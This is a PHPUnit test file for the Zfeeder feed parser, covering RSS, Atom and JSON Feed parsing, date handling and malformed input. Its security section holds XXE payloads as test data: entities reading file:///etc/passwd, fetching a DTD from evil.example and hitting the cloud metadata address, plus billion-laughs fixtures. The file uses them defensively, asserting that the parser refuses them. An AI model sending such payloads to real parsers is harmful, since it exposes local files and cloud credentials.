<?php

declare(strict_types=1);

namespace Zfeeder\Tests\Unit\Parse;

use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use Zfeeder\Exception\ParseException;
use Zfeeder\Parse\DateParser;
use Zfeeder\Parse\FeedParser;
use Zfeeder\Parse\JsonFeedReader;

#[CoversClass(FeedParser::class)]
#[CoversClass(DateParser::class)]
final class FeedParserTest extends TestCase
{
    private FeedParser $parser;

    protected function setUp(): void
    {
        $this->parser = new FeedParser();
    }

    /**
     * @return iterable<string, array{0: string, 1: string, 2: string, 3: int}> fixture, format, channel title, item count
     */
    public static function fixtures(): iterable
    {
        yield 'rss 2.0 (2004)' => ['feeds-2004/rss20-zfeeder.xml', 'rss-2.0', 'zFeeder', 4];
        yield 'rss 0.91 (2004)' => ['feeds-2004/rss091-oldnews.xml', 'rss-0.91', 'Old News Daily', 3];
        yield 'rss 0.92 (2004)' => ['feeds-2004/rss092-weblog.xml', 'rss-0.92', 'Weblog Central', 2];
        yield 'rss 1.0 rdf (2004)' => ['feeds-2004/rdf10-devchannel.xml', 'rss-1.0', 'DevChannel', 3];
        yield 'atom 1.0 (2026)' => ['feeds-2026/atom10-modern.xml', 'atom-1.0', 'Modern Atom Source', 3];
        yield 'rss 2.0 content' => ['feeds-2026/rss20-content-encoded.xml', 'rss-2.0', 'Tech Wire', 4];
        yield 'rss 2.0 science' => ['feeds-2026/rss20-science.xml', 'rss-2.0', 'Science Desk', 3];
        yield 'json feed 1.1' => ['feeds-2026/jsonfeed11-notes.json', 'json-1.1', 'Notes in JSON', 2];
    }

    #[DataProvider('fixtures')]
    public function testEveryFixtureMapsToTheExpectedChannel(string $fixture, string $format, string $title, int $items): void
    {
        $channel = $this->parse($fixture);

        self::assertSame($format, $channel->format);
        self::assertSame($title, $channel->title);
        self::assertCount($items, $channel->items);
        self::assertContains($channel->format, ['rss-0.91', 'rss-0.92', 'rss-1.0', 'rss-2.0', 'atom-1.0', 'json-1.1']);
    }

    #[DataProvider('fixtures')]
    public function testEveryItemKeepsAnIdATitleAndItsVerbatimDate(string $fixture): void
    {
        foreach ($this->parse($fixture)->items as $item) {
            self::assertNotSame('', $item->id, 'Every item needs an id to deduplicate on.');
            self::assertNotSame('', $item->title);
            if ($item->rawDate !== '') {
                self::assertInstanceOf(\DateTimeImmutable::class, $item->published);
            }
        }
    }

    public function testRss20ChannelMetadataAndItemsFrom2004(): void
    {
        $channel = $this->parse('feeds-2004/rss20-zfeeder.xml');

        self::assertSame('http://zvonnews.sourceforge.net', $channel->link);
        self::assertSame('zFeeder news', $channel->description);
        self::assertSame('en', $channel->language);
        self::assertSame('http://zvonnews.sourceforge.net/images/zflogo.png', $channel->logoUrl);
        self::assertSame('zFeeder', $channel->logoTitle);
        self::assertSame('http://zvonnews.sourceforge.net', $channel->logoLink);
        self::assertInstanceOf(\DateTimeImmutable::class, $channel->lastBuild);
        self::assertSame('2004-02-25T14:00:20+00:00', $channel->lastBuild->format('c'));

        $first = $channel->items[0];
        self::assertSame('zFeeder 1.6 released', $first->title);
        self::assertSame('http://zvonnews.sourceforge.net/news/1.6', $first->link);
        self::assertSame('http://zvonnews.sourceforge.net/news/1.6', $first->id, 'guid wins over the computed id.');
        self::assertStringStartsWith('Added WAP (wml) support', $first->summaryHtml);
        self::assertSame('', $first->contentHtml);
    }

    /**
     * The classic templates print the date exactly as the feed wrote it, so a
     * normalised value here would break the byte-identical goldens.
     *
     * @return iterable<string, array{0: string, 1: int, 2: string}>
     */
    public static function verbatimDates(): iterable
    {
        yield 'rss 2.0 pubDate' => ['feeds-2004/rss20-zfeeder.xml', 0, 'Sun, 25 Apr 2004 11:15:55 GMT'];
        yield 'rss 2.0 last item' => ['feeds-2004/rss20-zfeeder.xml', 3, 'Wed, 25 Feb 2004 03:08:01 GMT'];
        yield 'rdf dc:date' => ['feeds-2004/rdf10-devchannel.xml', 0, '2004-02-25T14:00:00Z'];
        yield 'atom published' => ['feeds-2026/atom10-modern.xml', 0, '2026-09-14T22:10:00Z'];
        yield 'json date_published' => ['feeds-2026/jsonfeed11-notes.json', 0, '2026-09-14T10:00:00Z'];
        yield 'rss 2.0 modern' => ['feeds-2026/rss20-content-encoded.xml', 0, 'Mon, 14 Sep 2026 23:07:56 GMT'];
    }

    #[DataProvider('verbatimDates')]
    public function testRawDateIsTheFeedsOwnText(string $fixture, int $index, string $expected): void
    {
        self::assertSame($expected, $this->parse($fixture)->items[$index]->rawDate);
    }

    public function testRss091KeepsItsItemsDespiteHavingNoDates(): void
    {
        $channel = $this->parse('feeds-2004/rss091-oldnews.xml');

        self::assertSame('en-us', $channel->language);
        self::assertSame('http://oldnews.example.org/logo.gif', $channel->logoUrl);
        self::assertSame('Mars rover sends first colour picture', $channel->items[0]->title);
        self::assertSame('', $channel->items[0]->rawDate);
        self::assertNull($channel->items[0]->published, 'A dateless item is normal in 0.91, not an error.');
        self::assertSame(
            sha1('http://oldnews.example.org/2004/mars|Mars rover sends first colour picture'),
            $channel->items[0]->id,
            'With no guid the id falls back to sha1(link|title).',
        );
    }

    public function testRdfItemsAreReadFromOutsideTheChannelElement(): void
    {
        $channel = $this->parse('feeds-2004/rdf10-devchannel.xml');

        self::assertSame('en', $channel->language, 'dc:language stands in for the missing language element.');
        self::assertSame('Kernel 2.6 ships', $channel->items[0]->title);
        self::assertSame('http://dev.example.com/1', $channel->items[0]->id, 'rdf:about identifies an RSS 1.0 item.');
        self::assertSame('2004-02-23T18:05:00+00:00', $channel->items[2]->published?->format('c'));
    }

    public function testContentEncodedBecomesContentAndDescriptionStaysTheSummary(): void
    {
        $item = $this->parse('feeds-2026/rss20-content-encoded.xml')->items[0];

        self::assertSame('The specification defines how agents locate machine readable descriptions.', $item->summaryHtml);
        self::assertStringContainsString('<p>The specification defines how agents locate', $item->contentHtml);
        self::assertStringContainsString('six months', $item->contentHtml);
        self::assertSame($item->contentHtml, $item->bodyHtml(), 'content:encoded wins for display.');
        self::assertSame('Newsroom', $item->author, 'dc:creator is the author.');
    }

    public function testRssEnclosureIsMapped(): void
    {
        $item = $this->parse('feeds-2026/rss20-content-encoded.xml')->items[1];

        self::assertCount(1, $item->enclosures);
        self::assertSame('https://techwire.example.com/audio/headset.mp3', $item->enclosures[0]->url);
        self::assertSame('audio/mpeg', $item->enclosures[0]->type);
        self::assertSame(18204404, $item->enclosures[0]->length);
    }

    public function testAtomMapsIdSummaryContentAndAuthor(): void
    {
        $channel = $this->parse('feeds-2026/atom10-modern.xml');

        self::assertSame('https://atom.example.org/', $channel->link);
        self::assertSame('Long form writing about software', $channel->description);
        self::assertSame('en', $channel->language, 'xml:lang carries the language in Atom.');
        self::assertSame('https://atom.example.org/icon.png', $channel->logoUrl);

        $first = $channel->items[0];
        self::assertSame('urn:uuid:9a1b2c3d-0000-4000-8000-000000000101', $first->id);
        self::assertSame('https://atom.example.org/posts/deterministic', $first->link);
        self::assertSame('A. Author', $first->author);
        self::assertStringContainsString('<strong>clocks</strong>', $first->contentHtml, 'Escaped html content is decoded.');
        self::assertStringNotContainsString('<', $first->summaryHtml);

        self::assertSame('', $channel->items[2]->author, 'An entry without an author is not an error.');
        self::assertSame('', $channel->items[1]->contentHtml, 'An entry may carry a summary and no content.');
    }

    public function testAtomXhtmlContentIsSerialisedRatherThanFlattened(): void
    {
        $channel = $this->parser->parse(<<<'XML'
            <?xml version="1.0" encoding="utf-8"?>
            <feed xmlns="http://www.w3.org/2005/Atom">
              <title>XHTML content</title>
              <entry>
                <title>Marked up</title>
                <link href="https://x.example/1"/>
                <id>tag:x.example,2026:1</id>
                <content type="xhtml"><div xmlns="http://www.w3.org/1999/xhtml"><p>Hello <em>there</em></p></div></content>
              </entry>
            </feed>
            XML, 'https://x.example/feed');

        self::assertStringContainsString('<em>there</em>', $channel->items[0]->contentHtml);
    }

    // ---- security --------------------------------------------------------

    public function testXxePayloadIsRefusedAndNeverReadsALocalFile(): void
    {
        $before = memory_get_usage();

        try {
            $this->parser->parse(zf_fixture_contents('payloads/xxe.xml'), 'https://evil.example/feed');
            self::fail('The XXE payload must be refused.');
        } catch (ParseException $e) {
            self::assertStringContainsStringIgnoringCase('internal subset', $e->getMessage());
        }

        self::assertLessThan(8 * 1024 * 1024, memory_get_usage() - $before);
    }

    public function testBillionLaughsIsRefusedWithoutExpanding(): void
    {
        $before = memory_get_usage();

        $this->expectException(ParseException::class);

        try {
            $this->parser->parse(zf_fixture_contents('payloads/billion-laughs.xml'), 'https://evil.example/feed');
        } finally {
            self::assertLessThan(8 * 1024 * 1024, memory_get_usage() - $before, 'Nothing may have been expanded.');
        }
    }

    /** @return iterable<string, array{0: string}> */
    public static function doctypePayloads(): iterable
    {
        yield 'file entity' => ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><rss version="2.0"><channel><title>&x;</title></channel></rss>'];
        yield 'parameter entity' => ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil.example/e.dtd"> %p;]><rss version="2.0"><channel><title>t</title></channel></rss>'];
        yield 'http entity' => ['<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><rss version="2.0"><channel><title>&x;</title></channel></rss>'];
        yield 'unknown external dtd' => ['<!DOCTYPE rss SYSTEM "http://evil.example/rss.dtd"><rss version="2.0"><channel><title>t</title></channel></rss>'];
        yield 'doctype after a comment' => ['<!-- hello --><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><rss version="2.0"><channel><title>&x;</title></channel></rss>'];
    }

    #[DataProvider('doctypePayloads')]
    public function testEveryDoctypeCarryingOrNamingAnExternalResourceIsRefused(string $payload): void
    {
        $this->expectException(ParseException::class);
        $this->parser->parse($payload, 'https://evil.example/feed');
    }

    public function testTheHistoricRss091DoctypeIsAcceptedButOptional(): void
    {
        $body = zf_fixture_contents('feeds-2004/rss091-oldnews.xml');

        self::assertCount(3, $this->parser->parse($body, 'https://old.example/feed')->items);

        $strict = new FeedParser(new JsonFeedReader(), allowHistoricDoctype: false);
        $this->expectException(ParseException::class);
        $strict->parse($body, 'https://old.example/feed');
    }

    public function testDoctypeInsideContentIsNotMistakenForAProlog(): void
    {
        $channel = $this->parser->parse(<<<'XML'
            <?xml version="1.0" encoding="UTF-8"?>
            <rss version="2.0"><channel>
              <title>About XML</title>
              <link>https://xml.example/</link>
              <description>d</description>
              <item>
                <title>Writing a &lt;!DOCTYPE&gt; declaration</title>
                <link>https://xml.example/1</link>
                <description><![CDATA[Start the file with <!DOCTYPE html> and carry on.]]></description>
              </item>
            </channel></rss>
            XML, 'https://xml.example/feed');

        self::assertCount(1, $channel->items);
        self::assertStringContainsString('<!DOCTYPE html>', $channel->items[0]->summaryHtml);
    }

    // ---- leniency and hard failures --------------------------------------

    /** @return iterable<string, array{0: string}> */
    public static function oddButAcceptableFeeds(): iterable
    {
        yield 'no items' => ['<rss version="2.0"><channel><title>Empty</title><link>https://e.example/</link><description>d</description></channel></rss>'];
        yield 'no titles anywhere' => ['<rss version="2.0"><channel><item><link>https://e.example/1</link></item></channel></rss>'];
        yield 'unknown elements' => ['<rss version="2.0" xmlns:zf="urn:zf"><channel><title>t</title><zf:mystery>?</zf:mystery><item><title>i</title><zf:weird x="1"/></item></channel></rss>'];
        yield 'no version attribute' => ['<rss><channel><title>t</title><item><title>i</title></item></channel></rss>'];
        yield 'empty item' => ['<rss version="2.0"><channel><title>t</title><item/></channel></rss>'];
    }

    #[DataProvider('oddButAcceptableFeeds')]
    public function testOddFeedsAreToleratedRatherThanRefused(string $xml): void
    {
        $channel = $this->parser->parse($xml, 'https://e.example/feed');

        self::assertNotSame('', $channel->format);
    }

    /** @return iterable<string, array{0: string}> */
    public static function fatalDocuments(): iterable
    {
        yield 'empty' => [''];
        yield 'whitespace only' => ["  \n\t "];
        yield 'not xml at all' => ['this is a 404 page, not a feed'];
        yield 'truncated xml' => ['<rss version="2.0"><channel><title>t</title>'];
        yield 'mismatched tags' => ['<rss version="2.0"><channel><title>t</description></channel></rss>'];
        yield 'html page' => ['<!doctype html><html><head><title>Not a feed</title></head><body>x</body></html>'];
        yield 'xml but not a feed' => ['<?xml version="1.0"?><catalog><book id="1"/></catalog>'];
        yield 'broken json' => ['{"version": "https://jsonfeed.org/version/1.1", "items": ['];
    }

    #[DataProvider('fatalDocuments')]
    public function testMalformedDocumentsThrow(string $body): void
    {
        $this->expectException(ParseException::class);
        $this->parser->parse($body, 'https://e.example/feed');
    }

    public function testJsonIsDetectedByContentEvenWithLeadingWhitespace(): void
    {
        $body = "\n\n  " . zf_fixture_contents('feeds-2026/jsonfeed11-notes.json');

        self::assertSame('json-1.1', $this->parser->parse($body, 'https://notes.example.io/feed.json')->format);
    }

    // ---- date parsing ----------------------------------------------------

    /** @return iterable<string, array{0: string, 1: string|null}> */
    public static function dates(): iterable
    {
        yield 'rfc 2822 with GMT' => ['Sun, 25 Apr 2004 11:15:55 GMT', '2004-04-25T11:15:55+00:00'];
        yield 'rfc 2822 with offset' => ['Sun, 25 Apr 2004 11:15:55 +0200', '2004-04-25T11:15:55+02:00'];
        yield 'rfc 2822 single digit day' => ['Sun, 4 Apr 2004 11:15:55 GMT', '2004-04-04T11:15:55+00:00'];
        yield 'rfc 2822 without seconds' => ['Sun, 25 Apr 2004 11:15 GMT', '2004-04-25T11:15:00+00:00'];
        yield 'rfc 2822 without weekday' => ['25 Apr 2004 11:15:55 GMT', '2004-04-25T11:15:55+00:00'];
        yield 'rfc 3339 zulu' => ['2026-09-14T22:10:00Z', '2026-09-14T22:10:00+00:00'];
        yield 'rfc 3339 offset' => ['2026-09-14T22:10:00+01:00', '2026-09-14T22:10:00+01:00'];
        yield 'rfc 3339 fractional' => ['2026-09-14T22:10:00.512Z', '2026-09-14T22:10:00+00:00'];
        yield 'sloppy space separator' => ['2026-09-14 22:10:00', '2026-09-14T22:10:00+00:00'];
        yield 'date only' => ['2026-09-14', '2026-09-14T00:00:00+00:00'];
        yield 'empty' => ['', null];
        yield 'nonsense' => ['not a date at all', null];
    }

    #[DataProvider('dates')]
    public function testDateParserAcceptsTheShapesFeedsActuallyUse(string $raw, ?string $expected): void
    {
        $parsed = DateParser::parse($raw);

        if ($expected === null) {
            self::assertNull($parsed);

            return;
        }

        self::assertInstanceOf(\DateTimeImmutable::class, $parsed);
        self::assertSame($expected, $parsed->format('c'));
    }

    private function parse(string $fixture): \Zfeeder\Parse\Model\Channel
    {
        return $this->parser->parse(zf_fixture_contents($fixture), 'https://example.test/' . $fixture);
    }
}
